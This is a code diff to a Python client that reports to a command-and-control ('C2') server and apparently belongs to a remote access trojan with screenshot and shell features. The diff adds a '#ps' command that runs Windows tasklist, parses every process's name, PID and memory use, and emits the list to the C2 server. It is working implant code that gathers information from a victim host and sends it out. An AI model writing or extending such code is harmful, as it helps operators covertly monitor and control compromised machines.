@@ -10,6 +10,7 @@ from PIL import Image
 import io
 import threading
 import sys
+import json
 import ctypes
 
 # --- Configuration ---
@@ -158,6 +159,28 @@ def on_disconnect():
     connection_start_time = 0
     log_event("WARNING: Disconnected from C2.")
 
+def handle_ps():
+    try:
+        # Tasklist format: CSV, No Header
+        res = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True)
+        if res.returncode == 0:
+            lines = res.stdout.strip().split('\n')
+            processes = []
+            for line in lines:
+                # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
+                parts = line.split('","')
+                if len(parts) >= 5:
+                    processes.append({
+                        "name": parts[0].replace('"', ''),
+                        "pid": parts[1].replace('"', ''),
+                        "mem": parts[4].replace('"', '')
+                    })
+            sio.emit('process_list', {'processes': processes}, namespace="/api")
+        else:
+            log_event(f"ERROR: tasklist failed: {res.stderr}")
+    except Exception as e:
+        log_event(f"ERROR: PS failed: {e}")
+
 def handle_internal_command(command_str):
     global SCREENSHOT_INTERVAL, shell_process
     parts = command_str.split()
@@ -174,6 +197,8 @@ def handle_internal_command(command_str):
                 log_event("ERROR: Invalid interval")
     elif cmd == "#logs":
         log_event("SYSTEM: Logs are active.")
+    elif cmd == "#ps":
+        handle_ps()
     elif cmd == "#reset":
         log_event("SYSTEM: Force resetting shell process...")
         if shell_process:
